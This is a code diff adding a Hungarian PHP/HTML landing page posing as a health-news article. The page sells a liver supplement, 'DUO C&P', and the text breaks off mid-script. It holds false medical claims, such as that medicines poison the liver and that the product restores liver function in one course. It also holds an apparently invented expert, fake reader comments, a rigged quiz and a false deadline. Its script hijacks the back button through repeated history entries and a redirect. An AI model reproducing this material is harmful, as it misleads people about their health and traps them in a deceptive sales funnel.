@@ -1,0 +1,764 @@
+<?php setcookie("FBpixel", $_GET["fbpixel"]); ?>
+<!DOCTYPE html>
+<html lang="hu">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>8 MÓDJA A MÁJ ELPUSZTÍTÁSÁNAK ÉS 1 MÓDJA A MEGMENTÉSÉNEK</title>
+    <link rel="icon" href="prod.png" type="image/x-icon">
+    <link rel="stylesheet" href="css/style.css">
+    <meta charset="UTF-8" />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.js"></script>
+    <script src="drewlex_main.js"></script>
+    <script>
+        (function () {
+            let params = (new URL(document.location)).searchParams;
+            let block = '';
+            params.forEach(function (value, key) {
+                block = block + key + '=' + value + '&';
+            })
+            var t;
+            try {
+                for (t = 0; 10 > t; ++t) history.pushState({}, "", document.location);
+                onpopstate = function (t) {
+                    t.state && location.replace("domonetka/index.php?cid={clickid}")
+                }
+            } catch (o) {}
+        })();
+    </script>
+     <script data-polyfil="webp">
+        ! function (e, n, A) {
+         function o(e, n) {
+            return typeof e === n
+         }
+
+         function t() {
+            var e, n, A, t, a, i, l;
+            for (var f in r)
+               if (r.hasOwnProperty(f)) {
+                  if (e = [], n = r[f], n.name && (e.push(n.name.toLowerCase()), n.options && n.options.aliases && n.options
+                     .aliases.length))
+                     for (A = 0; A < n.options.aliases.length; A++) e.push(n.options.aliases[A].toLowerCase());
+                  for (t = o(n.fn, "function") ? n.fn() : n.fn, a = 0; a < e.length; a++) i = e[a], l = i.split("."), 1 === l
+                     .length ? Modernizr[l[0]] = t : (!Modernizr[l[0]] || Modernizr[l[0]] instanceof Boolean || (Modernizr[l[
+                        0]] = new Boolean(Modernizr[l[0]])), Modernizr[l[0]][l[1]] = t), s.push((t ? "" : "no-") + l.join("-"))
+               }
+         }
+
+         function a(e) {
+            var n = u.className,
+               A = Modernizr._config.classPrefix || "";
+            if (c && (n = n.baseVal), Modernizr._config.enableJSClass) {
+               var o = new RegExp("(^|\s)" + A + "no-js(\s|$)");
+               n = n.replace(o, "$1" + A + "js$2")
+            }
+            Modernizr._config.enableClasses && (n += " " + A + e.join(" " + A), c ? u.className.baseVal = n : u.className =
+               n)
+         }
+
+         function i(e, n) {
+            if ("object" == typeof e)
+               for (var A in e) f(e, A) && i(A, e[A]);
+            else {
+               e = e.toLowerCase();
+               var o = e.split("."),
+                  t = Modernizr[o[0]];
+               if (2 == o.length && (t = t[o[1]]), "undefined" != typeof t) return Modernizr;
+               n = "function" == typeof n ? n() : n, 1 == o.length ? Modernizr[o[0]] = n : (!Modernizr[o[0]] || Modernizr[o[
+                  0]] instanceof Boolean || (Modernizr[o[0]] = new Boolean(Modernizr[o[0]])), Modernizr[o[0]][o[1]] = n), a(
+                     [(n && 0 != n ? "" : "no-") + o.join("-")]), Modernizr._trigger(e, n)
+            }
+            return Modernizr
+         }
+         var s = [],
+            r = [],
+            l = {
+               _version: "3.6.0",
+               _config: {
+                  classPrefix: "",
+                  enableClasses: !0,
+                  enableJSClass: !0,
+                  usePrefixes: !0
+               },
+               _q: [],
+               on: function (e, n) {
+                  var A = this;
+                  setTimeout(function () {
+                     n(A[e])
+                  }, 0)
+               },
+               addTest: function (e, n, A) {
+                  r.push({
+                     name: e,
+                     fn: n,
+                     options: A
+                  })
+               },
+               addAsyncTest: function (e) {
+                  r.push({
+                     name: null,
+                     fn: e
+                  })
+               }
+            },
+            Modernizr = function () { };
+         Modernizr.prototype = l, Modernizr = new Modernizr;
+         var f, u = n.documentElement,
+            c = "svg" === u.nodeName.toLowerCase();
+         ! function () {
+            var e = {}.hasOwnProperty;
+            f = o(e, "undefined") || o(e.call, "undefined") ? function (e, n) {
+               return n in e && o(e.constructor.prototype[n], "undefined")
+            } : function (n, A) {
+               return e.call(n, A)
+            }
+         }(), l._l = {}, l.on = function (e, n) {
+            this._l[e] || (this._l[e] = []), this._l[e].push(n), Modernizr.hasOwnProperty(e) && setTimeout(function () {
+               Modernizr._trigger(e, Modernizr[e])
+            }, 0)
+         }, l._trigger = function (e, n) {
+            if (this._l[e]) {
+               var A = this._l[e];
+               setTimeout(function () {
+                  var e, o;
+                  for (e = 0; e < A.length; e++)(o = A[e])(n)
+               }, 0), delete this._l[e]
+            }
+         }, Modernizr._q.push(function () {
+            l.addTest = i
+         }), Modernizr.addAsyncTest(function () {
+            function e(e, n, A) {
+               function o(n) {
+                  var o = n && "load" === n.type ? 1 == t.width : !1,
+                     a = "webp" === e;
+                  i(e, a && o ? new Boolean(o) : o), A && A(n)
+               }
+               var t = new Image;
+               t.onerror = o, t.onload = o, t.src = n
+            }
+            var n = [{
+               uri: "data:image/webp;base64,UklGRiQAAABXRUJQVlA4IBgAAAAwAQCdASoBAAEAAwA0JaQAA3AA/vuUAAA=",
+               name: "webp"
+            }, {
+               uri: "data:image/webp;base64,UklGRkoAAABXRUJQVlA4WAoAAAAQAAAAAAAAAAAAQUxQSAwAAAABBxAR/Q9ERP8DAABWUDggGAAAADABAJ0BKgEAAQADADQlpAADcAD++/1QAA==",
+               name: "webp.alpha"
+            }, {
+               uri: "data:image/webp;base64,UklGRlIAAABXRUJQVlA4WAoAAAASAAAAAAAAAAAAQU5JTQYAAAD/////AABBTk1GJgAAAAAAAAAAAAAAAAAAAGQAAABWUDhMDQAAAC8AAAAQBxAREYiI/gcA",
+               name: "webp.animation"
+            }, {
+               uri: "data:image/webp;base64,UklGRh4AAABXRUJQVlA4TBEAAAAvAAAAAAfQ//73v/+BiOh/AAA=",
+               name: "webp.lossless"
+            }],
+               A = n.shift();
+            e(A.name, A.uri, function (A) {
+               if (A && "load" === A.type)
+                  for (var o = 0; o < n.length; o++) e(n[o].name, n[o].uri)
+            })
+         }), t(), a(s), delete l.addTest, delete l.addAsyncTest;
+         for (var p = 0; p < Modernizr._q.length; p++) Modernizr._q[p]();
+         e.Modernizr = Modernizr
+      }(window, document)
+   </script>
+</head>
+
+<body class="flex ev-date">
+    <header class="header">
+        <div class="header__container container">
+            <div class="header__row">
+                <div class="logo logo_header"> <img alt="logo" class="logo__img" src="img/logo.svg">
+                    <div class="logo__text">
+                        <h2 class="logo__title lt0">EGÉSZSÉGÜGYI HÍREK</h2>
+                        <h3 class="logo__subtitle lt1">Nyilvános kiadás</h3>
+                    </div>
+                </div>
+            </div>
+            <div class="header__row">
+                <nav class="nav"> <span class="nav__item lt2">Főoldal</span><span
+                        class="nav__item nav__item_active lt3">Betegségek</span><span class="nav__item lt4">Tünetek
+                    </span><span class="nav__item lt5">Mentőszolgálat</span><span class="nav__item lt6">Egészség
+                        karbantartása</span><span class="nav__item lt7">Hírek és hozzászólások</span>
+                </nav>
+            </div>
+        </div>
+    </header>
+    <main class="container">
+        <section class="content">
+            <ul class="breadcrumbs">
+                <li class="breadcrumbs__item lt8">Főoldal</li>
+                <li class="breadcrumbs__item lt9">MÁJ ÉS EPEHÓLYAG MEGBETEGEDÉSEK</li>
+                <li class="breadcrumbs__item lt10">MÁJBETEGSÉG MEGNYILVÁNULÁSAI</li>
+                <li class="breadcrumbs__item lt11">8 MÓDJA A MÁJ ELPUSZTíTÁSÁNAK ÉS 1 MÓDJA A MEGMENTÉSÉNEK</li>
+            </ul>
+            <aside class="aside">
+                <div class="aside__item">
+                    <h3 class="aside__title lt12">A TÉMÁRÓL</h3>
+                    <ul class="aside__list aside__list_borderRight">
+                        <li class="aside__list-item aside__list-item_underline"> <a class="lt13" href="#ordera0">8 módja
+                                a máj elpusztításának és 1 módja a megmentésének</a> </li>
+                        <li class="aside__list-item aside__list-item_underline"> <a class="lt14" href="#ordera0">A beteg
+                                máj egy olyan vezérlőgomb, amely az egész szervezet önpusztítását kiválthatja</a>
+                        </li>
+                        <li class="aside__list-item aside__list-item_underline"> <a class="lt15" href="#ordera0">A beteg
+                                máj tünetei</a> </li>
+                        <li class="aside__list-item aside__list-item_underline"> <a class="lt16" href="#ordera0">Hogyan
+                                állítsuk helyre a májat?</a> </li>
+                    </ul>
+                </div>
+                <div class="aside__item">
+                    <h3 class="aside__title lt17">EGYÉB TÉMÁK EBBEN A KATEGÓRIÁBAN</h3>
+                    <div class="block__border">
+                        <ul class="aside__list">
+                            <li class="aside__list-item aside__list-item_arrow lt18">Bevezetés a májbetegségekbe</li>
+                            <li class="aside__list-item aside__list-item_arrow lt19">Epekőképződés</li>
+                            <li class="aside__list-item aside__list-item_arrow lt20">Zsírmáj</li>
+                            <li class="aside__list-item aside__list-item_arrow lt21">Hepatikus enkefalopátia</li>
+                            <li class="aside__list-item aside__list-item_arrow lt22">Sárgaság felnőtteknél</li>
+                            <li class="aside__list-item aside__list-item_arrow lt23">Májelégtelenség</li>
+                            <li class="aside__list-item aside__list-item_arrow lt24">Portalis hypertonia</li>
+                        </ul>
+                    </div>
+                </div>
+            </aside>
+            <div class="post">
+                <h2 class="post__title"><span class="date-7 lt26">14.11.2022</span></h2>
+                <h1 class="title lt27" id="title1">8 MÓDJA A MÁJ ELPUSZTÍTÁSÁNAK ÉS 1 MÓDJA A MEGMENTÉSÉNEK</h1>
+                <h2 class="subtitle lt28">Barta Erzsébet, a májbetegségeket tanulmányozó egyesület tagjának kommentárja
+                </h2>
+                <figure>
+                    <picture>
+                        <source type="image/webp" media="(min-width:480px)" srcset="img/post1.webp">
+                        <source media="(min-width:480px)" srcset="img/post1.jpg">
+                        <source type="image/webp" media="(min-width:300px)" srcset="img/post1-mob.webp">
+                        <source media="(min-width:300px)" srcset="img/post1-mob.jpg">
+                        <img class="post__img" alt="post-img" src="img/post1.jpg">
+                    </picture>
+                    <figcaption class="lt29">Barta Erzsébet</figcaption>
+                </figure>
+                <p class="lt30">A máj és az epehólyag a legfontosabb belső szervek közé tartozik. Az, hogy ezek mennyire
+                    vannak jó, vagy pedig rossz állapotban, nagymértékben meghatározza az élet minőségét és hosszát. A
+                    májsejtek gyakran feláldozzák magukat, hogy a vérből kiszűrjék a méreganyagokat, így védve meg a
+                    többi szervet és rendszert a toxikus károsodástól. Az epehólyag feladata, az epe táplálása és
+                    termelése, amely közvetlenül részt vesz az emésztésben. A helytelen táplálkozás, a rossz környezeti
+                    behatások, a stressz és a káros szokások mind-mind megterhelik a máj állapotát, ami
+                    májelégtelenséghez vezethet. Napjainkban a májbetegség a tíz leggyakoribb halálozási ok egyike a
+                    világon. Ami még ijesztőbb: mindannyian veszélyben vagyunk. Mi mindannyian:</p>
+                <ol>
+                    <li>
+                        <h4 class="lt33">Zsíros, sült ételeket fogyasztunk</h4>
+                        <p class="lt34"> Az olajban annak sütésekor rákkeltő anyagok képződnek, amelyek károsítják a
+                            májsejteket és rákot okozhatnak.</p>
+                    </li>
+                    <li>
+                        <h4 class="lt35">A "gyors" szénhidrátokat tartalmazó ételeket bevonjuk az étrendünkbe
+                        </h4>
+                        <p class="lt36">Az olyan élelmiszerek, mint a gabonafélék, édességek, kenyér, tésztafélék és más
+                            lisztes termékek megterhelik a máj és az epehólyag működését.
+                        </p>
+                    </li>
+                    <li>
+                        <h4 class="lt37">Szeretjük a füstölt és fűszeres ételeket</h4>
+                        <p class="lt38"> Én is szeretem a füstölt ételeket, a fűszeres szószokat és fűszerkeverékeket. A
+                            fűszeres ételek különösen rossz hatással vannak a májra: méregként érzékelődnek, és a máj
+                            aktívan, fokozott epeműködéssel próbálja semlegesíteni azokat, ami viszont epekövek
+                            kialakulásához vezet.</p>
+                    </li>
+                    <li>
+                        <h4 class="lt39">Egymással összeférhetetlen ételeket fogyasztunk</h4>
+                        <p class="lt40">Kerülje a fehérjetartalmú ételek (tojás, hús, sajt, hal) és a szénhidrátok
+                            (gabonafélék, gabona, kenyér, cukor) egyidejű fogyasztását, ha meg akarja őrizni a mája
+                            egészségét.</p>
+                    </li>
+                    <li>
+                        <h4 class="lt41">Mozgásszegény életmódot folytatunk</h4>
+                        <p class="lt42">Ez egyáltalán nem tesz jót az egészségnek.</p>
+                    </li>
+                    <li>
+                        <h4 class="lt43">Gyógyszertári készítmények fogyasztása</h4>
+                        <p class="lt44">A kémiai vegyületek önmagukban mérgező anyagok, amelyek a szervezet fő szűrőjén,
+                            a májon keresztül távoznak, eltömítve annak apró ereit.</p>
+                    </li>
+                    <li>
+                        <h4 class="lt45">Szeretjük az erős kávét</h4>
+                        <p class="lt46">Ez egy nagyon erős vegyület, amely ártalmas a májra. Az éhgyomorra fogyasztott
+                            kávé különösen veszélyes.
+                        </p>
+                    </li>
+                    <li>
+                        <h4 class="lt47">Iszogatunk jó társaságban</h4>
+                        <p class="lt48">Nos, a máj legnagyobb ellensége az alkohol. A máj szó szerint halálra dolgozza
+                            magát, hogy feldolgozza az etil-alkoholt. Ivott este néhány pohár sört vagy bort? Mondjon
+                            örökre búcsút néhány ezer hepatocitának (májsejtnek).</p>
+                    </li>
+                </ol>
+                <figure>
+                    <div class="box__item">
+                        <div class="box__images">
+                            <picture>
+                                <source type="image/webp" srcset="img/44.webp">
+                                <img src="img/44.jpg" id="contentImage2" alt="img" class="toggle-image image-26 first">
+                            </picture>
+                            <picture>
+                                <source media="(min-width:480px)" srcset="img/post2.jpg">
+                                <source media="(min-width:300px)" srcset="img/post2-mob.jpg">
+                                <img class="post__img toggle-image post__img image-26 second" alt="post-img"
+                                    src="img/post2.jpg">
+                            </picture>
+                        </div>
+                    </div>
+                    <figcaption class="lt49">Májzsugorodás</figcaption>
+                </figure>
+                <p class="lt50">A fenti negatív tényezők miatt a máj elveszíti egyedülálló, öngyógyító képességét. A
+                    sérült sejteket zsír és kötőszövet helyettesíti. Ennek következtében a szerv hegessé válik, és
+                    elveszíti képességét, hogy ellássa funkcióit. Ennek a folyamatnak a végeredménye a májzsugorodás és
+                    az elsődleges daganatos megbetegedés.
+                </p>
+                <p class="lt51">És ne gondolja, hogy ha nincsenek fájdalmai, akkor minden rendben van! A beteg máj
+                    sokáig nem jelzi, hogy valami baj van. Még a májzsugorodás is gyakran az utolsó stádiumban derül ki,
+                    amikor már nem tehetünk mást, mint hogy új májat ültetünk be. A májproblémák meglepetésként érhetik
+                    önt: a máj mindaddig csendben marad, amíg a dolgok rosszra nem fordulnak..
+                </p>
+                <h3 class="lt52" id="title2">A beteg máj egy olyan vezérlőgomb, amely az egész szervezet önpusztítását
+                    kiválthatja.
+                </h3>
+                <p class="lt53">A cukorbetegség, a szívinfarktus, az agyi keringési zavarok, a szív- és érrendszeri
+                    betegségek mind a májbetegség következményei, mivel a máj nem látja el a vértisztítás feladatát. Ezt
+                    követi a többi szerv károsodása.
+                </p>
+                <figure>
+                    <div class="box__item">
+                        <div class="box__images">
+                            <picture>
+                                <source type="image/webp" srcset="img/44.webp">
+                                <img src="img/44.jpg" alt="img" class="toggle-image image-26 first">
+                            </picture>
+                            <picture>
+                                <source type="image/webp" media="(min-width:480px)" srcset="img/post3.webp">
+                                <source media="(min-width:480px)" srcset="img/post3.jpg">
+                                <source type="image/webp" media="(min-width:300px)" srcset="img/post3-mob.webp">
+                                <source media="(min-width:300px)" srcset="img/post3-mob.jpg">
+                                <img class="post__img toggle-image post__img image-26 second" alt="post-img"
+                                    src="img/post3.jpg">
+                            </picture>
+                        </div>
+                    </div>
+                    <figcaption class="lt54">Májzsugorodás</figcaption>
+                </figure>
+                <div class="quiz" id="quiz">
+                    <form class="form quiz__item" id="order_form0">
+                        <div class="form__item"> <label class="form__label lt55" for="age">Életkora:</label><select
+                                class="quiz__input" id="age" name="age">
+                                <option class="lt56" value="1">kevesebb mint 40</option>
+                                <option class="lt57" value="2">kevesebb mint 60</option>
+                                <option class="lt58" value="3">több mint 60</option>
+                            </select> </div>
+                        <div class="form__item"> <label class="form__label lt59"
+                                for="bodyType">Testalkat:</label><select class="quiz__input" id="bodyType"
+                                name="bodyType">
+                                <option class="lt60" value="1">vékony</option>
+                                <option class="lt61" value="2">átlagos </option>
+                                <option class="lt62" value="3">molett</option>
+                            </select> </div>
+                        <div class="form__item"> <label class="form__label lt63" for="medical">Hány gyógyszert szed
+                                rendszeresen?</label><select class="quiz__input" id="medical" name="medical">
+                                <option class="lt64" value="1">egyáltalán nem fogyasztok </option>
+                                <option class="lt65" value="2">egyféle</option>
+                                <option class="lt66" value="3">többféle</option>
+                            </select> </div>
+                        <div class="form__item"> <label class="form__label lt67" for="sport">Szokott
+                                sportolni?</label><select class="quiz__input" id="sport" name="sport">
+                                <option class="lt68" value="1">igen, gyakran</option>
+                                <option class="lt69" value="2">igen, néha </option>
+                                <option class="lt70" value="3">nem, soha</option>
+                            </select> </div>
+                        <div class="form__item"> <label class="form__label lt71" for="alcohol">Mennyi alkoholt
+                                fogyaszt?</label><select class="quiz__input" id="alcohol" name="alcohol">
+                                <option class="lt72" value="1">egyáltalán nem fogyasztok</option>
+                                <option class="lt73" value="2">egy pohár bor vagy sör hétvégén</option>
+                                <option class="lt74" value="3">naponta fogyasztok</option>
+                            </select> </div>
+                        <div class="form__item"> <label class="form__label lt75" for="coffee">Mennyi kávét
+                                iszik?</label><select class="quiz__input" id="coffee" name="coffee">
+                                <option class="lt76" value="1">nem iszom</option>
+                                <option class="lt77" value="2">napi egy csésze</option>
+                                <option class="lt78" value="3">két csésze vagy annál több </option>
+                            </select> </div>
+                        <div class="form__item"> <label class="form__label lt79" for="pain">Kellemetlenséget érez a has
+                                jobb oldali tájékán?</label><select class="quiz__input" id="pain" name="pain">
+                                <option class="lt80" value="1">nem</option>
+                                <option class="lt81" value="2">igen, néha</option>
+                                <option class="lt82" value="3">igen, gyakran</option>
+                            </select> </div>
+                        <div class="form__item form__item_btn"> <button class="quiz__btn lt83">EREDMÉNY
+                                MEGJELENÍTÉSE</button>
+                        </div>
+                    </form>
+                    <div class="quiz__item quiz__item-textarea">
+                        <h5 class="quiz__title lt84">Eredmény:</h5>
+                        <div class="quiz__result">
+                            <p class="quiz__result-item quiz__result-item_1 lt85">Az ön mája rendben van.</p>
+                            <p class="quiz__result-item quiz__result-item_2 lt86">Az ön mája veszélyben van. Gondolnia
+                                kell a mája egészségére.</p>
+                            <p class="quiz__result-item quiz__result-item_3 lt87">Azonnal gondoskodnia kell mája
+                                egészségéről! </p>
+                        </div>
+                    </div>
+                </div>
+                <figure>
+                    <div class="box__item">
+                        <div class="box__images">
+                            <picture>
+                                <source type="image/webp" srcset="img/44.webp">
+                                <img src="img/44.jpg" alt="img" class="toggle-image image-26 first">
+                            </picture>
+                            <picture>
+                                <source type="image/webp" media="(min-width:480px)" srcset="img/post4.webp">
+                                <source media="(min-width:480px)" srcset="img/post4.jpg">
+                                <source type="image/webp" media="(min-width:300px)" srcset="img/post4-mob.webp">
+                                <source media="(min-width:300px)" srcset="img/post4-mob.jpg">
+                                <img class="post__img toggle-image post__img image-26 second" alt="post-img"
+                                    src="img/post4.jpg">
+                            </picture>
+                        </div>
+                    </div>
+                    <figcaption class="lt88">Epekövek jelenléte</figcaption>
+                </figure>
+                <h3 class="lt89" id="title3">Hogyan lehet a májat helyreállítani?</h3>
+                <p class="lt90">A növényi májvédő készítmények kiváló munkát végeznek. Nem a vegyszerek, hanem éppen
+                    ezek hatnak pozitívan a májra és az epehólyagra.</p>
+                <p class="lt91">Az történik, hogy az ezekben a termékekben lévő növényi anyagokat a máj nem érzékeli
+                    toxinokként (ellentétben a szintetikus anyagokkal), és a tápanyagokat közvetlenül a szükséges szerv
+                    sejtjeihez juttatják el.</p>
+                <p class="lt92">Kiváló példa egy ilyen termékre egy nemrégiben bevezetett új generációs májvédő
+                    készítmény: a <a href="#ordera0"><span class="productName"></span></a>.</p>
+                <p>
+                    <picture>
+                        <img alt="product" class="product__img" src="prod.png">
+                    </picture>
+                </p>
+                <p class="lt93">A <a href="#ordera0"><span class="productName"></span></a> nemcsak a májat, hanem az egész
+                    szervezetet is védi a méreganyagoktól. Ez a készítmény segít növelni a máj ellenállóképességét a
+                    kórokozókkal szemben, és segít növelni a méregtelenítés szintjét. Ez a máj természetes védelmi és
+                    helyreállító mechanizmusainak aktiválásával és az enzimrendszerek aktivitásának növelésével
+                    történik.</p>
+                <p class="lt94">A monológ befejezéseként pedig következzenek Hofi Kálmán kollégám szavai:</p>
+                <figure>
+                    <picture>
+                        <source type="image/webp" media="(min-width:480px)" srcset="img/post5.webp">
+                        <source media="(min-width:480px)" srcset="img/post5.jpg">
+                        <source type="image/webp" media="(min-width:300px)" srcset="img/post5-mob.webp">
+                        <source media="(min-width:300px)" srcset="img/post5-mob.jpg">
+                        <img class="post__img" alt="post-img" src="img/post5.jpg">
+                    </picture>
+                    <figcaption class="lt95">Hofi Kálmán</figcaption>
+                </figure>
+                <p class="lt96">Egyetlen más szerv sem lát el annyi funkciót, mint a máj. <a
+                        href="#ordera0"><span class="productName"></span></a> - olyan készítmény, amelyre ma mindenkinek szüksége
+                    van, mivel a korszerű életmód, a káros szokások, a szennyezett környezet, a helytelen táplálkozás -
+                    mindez tönkreteszi a májat, és annak regenerálódási képessége ellenére egyes sejtek reménytelenül
+                    elhalnak.</p>
+                <p class="lt97">A <a href="#ordera0"><span class="productName"></span></a> hatását egy vizsgálati sorozat is
+                    megerősítette, amely kimutatta, hogy még azoknál a betegeknél is, akiknek a májfunkciója csak 20%-os
+                    volt, a <a href="#ordera0"><span class="productName"></span></a> egyetlen kúra után helyre tudta állítani a
+                    májfunkcióit.</p>
+                <p class="lt98">A <a href="#ordera0"><span class="productName"></span></a> megvásárlásának helye: Mivel a termékkel
+                    kapcsolatos kísérletek nemrég értek véget, a kiskereskedelmi gyógyszertárakban még nem kapható, de
+                    minden jóváhagyás készen áll és rendben van. Ezért a gyártó létrehozott egy weboldalt a termék
+                    népszerűsítésére és reklámozására, ahol már ma 50%-os <span class="nowrap"> (<span
+                            class="date-0 red"></span> -IG ÉRVÉNYES)</span> kedvezménnyel vásárolhat <a
+                        href="#ordera0"><span class="productName"></span></a>-t, siessen, mielőtt a promóció véget ér.</p>
+                        <div class="features-wrapper"></div>
+                <section class="comment-block">
+                    <div class="comment-header"> <span class="comment-heading lt108">Hozzászólások:</span> </div>
+                    <div class="comment-main">
+                        <div class="comment">
+                            <div class="avatar inL_627537"></div>
+                            <div class="comment-content">
+                                <div class="comment-info"> <span class="comment-name lt109">Vecse Bálint</span><span
+                                        class="comment-circle"></span><span class="date-4 lt110">14.11.2022</span>
+                                </div>
+                                <p class="comment-text lt111">Az utóbbi időben a májam elkezdte felmondani a
+                                    szolgálatot, a fájdalom nem volt állandó, de időnként intenzívebb volt. Kezdek
+                                    megijedni... Kipróbálom a <a href="#ordera0"><span class="productName"></span></a> készítményt.
+                                    Félek mindenféle vegyszereket tömni magamba.
+                                </p>
+                            </div>
+                        </div>
+                        <div class="comment">
+                            <div class="avatar inL_495466"></div>
+                            <div class="comment-content">
+                                <div class="comment-info"> <span class="comment-name lt112">Nagy-Farkas
+                                        Odett</span><span class="comment-circle"></span><span
+                                        class="date-4 lt113">15.11.2022</span>
+                                </div>
+                                <p class="comment-text lt114">Személyes tapasztalatból tudom, milyen ez. A férjem
+                                    májzsugorban halt meg. Hirtelen. Egy nap besárgult, rosszul lett, egyenesen a
+                                    kórházba vittem. Eltelt egy hét, és elment... Vigyázzon mindenki magára, mielőtt túl
+                                    késő lenne! </p>
+                            </div>
+                        </div>
+                        <div class="comment">
+                            <div class="avatar inL_252453"></div>
+                            <div class="comment-content">
+                                <div class="comment-info"> <span class="comment-name lt115">Leszkoven Babett</span><span
+                                        class="comment-circle"></span><span class="date-3 lt116">16.11.2022</span>
+                                </div>
+                                <p class="comment-text lt117">A teszt azt mutatta, hogy sürgősen tennem kell valamit
+                                    :((( és valóban úgy gondolom, hogy igen. Megrendeltem a <a
+                                        href="#ordera0"><span class="productName"></span></a> készítményt, hogy most már
+                                    gondoskodjak a májamról.
+                                </p>
+                            </div>
+                        </div>
+                        <div class="comment">
+                            <div class="avatar inL_378932"></div>
+                            <div class="comment-content">
+                                <div class="comment-info"> <span class="comment-name lt118">Danó Máté</span><span
+                                        class="comment-circle"></span><span class="date-3 lt119">16.11.2022</span>
+                                </div>
+                                <p class="comment-text lt120">Azt mondták, hogy meg kell tisztítsam a májamat.
+                                    Kipróbálom a <a href="#ordera0"><span class="productName"></span></a> készítménnyel a
+                                    tisztítást.
+                                </p>
+                                <!-- <picture>
+                                    <source type="image/webp" srcset="img/live1.webp">
+                                    <img class="comment__img" src="img/live1.jpg" alt="img">
+                                </picture> -->
+                            </div>
+                        </div>
+                        <div class="comment">
+                            <div class="avatar inL_673729"></div>
+                            <div class="comment-content">
+                                <div class="comment-info"> <span class="comment-name lt121">Ferenc Barbara</span><span
+                                        class="comment-circle"></span><span class="date-3 lt122">17.11.2022</span>
+                                </div>
+                                <p class="comment-text lt123">Nagyon aggódom a májam miatt. Szeretek iszogatni és enni.
+                                    A hozzám hasonló embereknek valószínűleg májvédő készítményekre van szükségük.
+                                </p>
+                            </div>
+                        </div>
+                        <div class="comment">
+                            <div class="avatar inL_522805"></div>
+                            <div class="comment-content">
+                                <div class="comment-info"> <span class="comment-name lt124">Bocskai Edit</span><span
+                                        class="comment-circle"></span><span class="date-2 lt125">18.11.2022</span>
+                                </div>
+                                <p class="comment-text lt126">Véletlenül derült ki egy ultrahangvizsgálat során, hogy
+                                    zsírmájam van. Félek, hogy a májam egy idő után egy haszontalan zsírdarabkává válik
+                                    :(
+                                </p>
+                            </div>
+                        </div>
+                        <div class="comment">
+                            <div class="avatar inL_792010"></div>
+                            <div class="comment-content">
+                                <div class="comment-info"> <span class="comment-name lt127">Román Eduárd</span><span
+                                        class="comment-circle"></span><span class="date-2 lt128">19.11.2022</span>
+                                </div>
+                                <p class="comment-text lt129">Egy barátom azt tanácsolta, hogy vegyek <a
+                                        href="#ordera0"><span class="productName"></span></a>-t. Azt mondja, sokat segített neki :)
+                                </p>
+                                <!-- <picture>
+                                    <source type="image/webp" srcset="img/live2.webp">
+                                    <img class="comment__img" src="img/live2.jpg" alt="img">
+                                </picture> -->
+                            </div>
+                        </div>
+                        <div class="comment">
+                            <div class="avatar inL_711916"></div>
+                            <div class="comment-content">
+                                <div class="comment-info"> <span class="comment-name lt130">Komáromi
+                                        Eleonóra</span><span class="comment-circle"></span><span
+                                        class="date-2 lt131">20.11.2022</span>
+                                </div>
+                                <p class="comment-text lt132">Jelenleg <a href="#ordera0"><span class="productName"></span></a>-t
+                                    szedek. A második hét óta összességében jobban érzem magam: már nem vagyok
+                                    krónikusan fáradt, kevésbé vagyok álmos és energikusabb lettem. És a külső
+                                    megjelenésem is sokkal jobb: a bőröm frissebb, a pattanások eltűntek. Összességében
+                                    ajánlom!
+                                </p>
+                                <!-- <picture>
+                                    <source type="image/webp" srcset="img/live3.webp">
+                                    <img class="comment__img" src="img/live3.jpg" alt="img">
+                                </picture> -->
+                            </div>
+                        </div>
+                        <div class="comment">
+                            <div class="avatar inL_814408"></div>
+                            <div class="comment-content">
+                                <div class="comment-info"> <span class="comment-name lt133">Fábián Elemér
+                                    </span><span class="comment-circle"></span><span
+                                        class="date-1 lt134">20.11.2022</span>
+                                </div>
+                                <p class="comment-text lt135">Az allergiám néhány hét után elmúlt.
+                                </p>
+                            </div>
+                        </div>
+                        <div class="comment">
+                            <div class="avatar inL_400761"></div>
+                            <div class="comment-content">
+                                <div class="comment-info"> <span class="comment-name lt136">Mátyás Renáta</span><span
+                                        class="comment-circle"></span><span class="date-0 lt137">21.11.2022</span>
+                                </div>
+                                <p class="comment-text lt138">Kitöltöttem a megrendelőlapot, várom a csomagot!!
+                                </p>
+                            </div>
+                        </div>
+                        <button class="show__form">Hagyj egy megjegyzést</button>
+                        <div class="comment__send">
+                            <h3 class="lt139">Hagyj egy megjegyzést:</h3><input
+                                class="comment__input comment__input-name" placeholder="Név" type="text"> <textarea
+                                class="comment__input comment__input-text"
+                                placeholder="Hozzászólások"></textarea><button
+                                class="comment__btn lt140">KÜLDÉS</button>
+                        </div>
+                        <div class="comment comment__new">
+                            <div class="avatar avatar_new"></div>
+                            <div class="comment-content">
+                                <div class="comment-info lt141"> <span
+                                        class="comment-name comment-name_new"></span>,<span class="date-0"></span>
+                                </div>
+                                <div class="comment-text comment-text_new"></div>
+                            </div>
+                        </div>
+                        <p class="comment__admin lt142">A hozzászólásod moderálás alatt van</p>
+                    </div>
+                    <picture>
+                        <img alt="product" class="product__img footer__product" src="img/product.png">
+                    </picture>
+                    <a href="#ordera0" class="all-form__btn lt105 footer__btn">VÁSÁRLÁS MOST!</a>
+                </section>
+
+            </div>
+        </section>
+
+    </main>
+    <footer class="footer">
+
+
+        <div class="bel-footer-block">
+            <div class="bel-container">
+                <div class="footer-block-left">
+                    <h2 class="footer-left-title"> Informàciò a vàsàrlò szàmàra </h2>
+                    <div class="footer-left-info"> A linkre kattintva és megrendelve a terméket, Ön elfogadja az erre a
+                        termékre vonatkozó adás-vételi szerződést. A weboldalunkon hagyott rendelése szolgál a
+                        megrendelési igényének a megerősítésére. Jogában áll felbontani a szerződést, lemondani a
+                        megrendelt termékről és visszaküldeni a terméket a jogszabályoknak megfelelően. Az eladó köteles
+                        minden Ön által benyújtott, a termékkel és szállításával összefüggő követelést elfogadni és
+                        figyelembe venni. A fentiekről bővebben tanácsadóinktól tájékozódhat</div>
+                </div>
+            </div>
+        </div>
+
+    </footer>
+
+    <script src="js/script.js"> </script>
+    <script>
+        const offer_params = {
+            priceMain : '9900',
+            customPriceOld: '',//вказуєм свою стару ціну якщо не підходить звичайна ціна *2
+            currencyMain: 'ƒ',
+            productName : 'DUO C&P',
+        };
+    
+    
+        var productName = document.getElementsByClassName("productName");
+        var priceMain = document.getElementsByClassName("priceMain");
+        var priceOld = document.getElementsByClassName("priceOld");
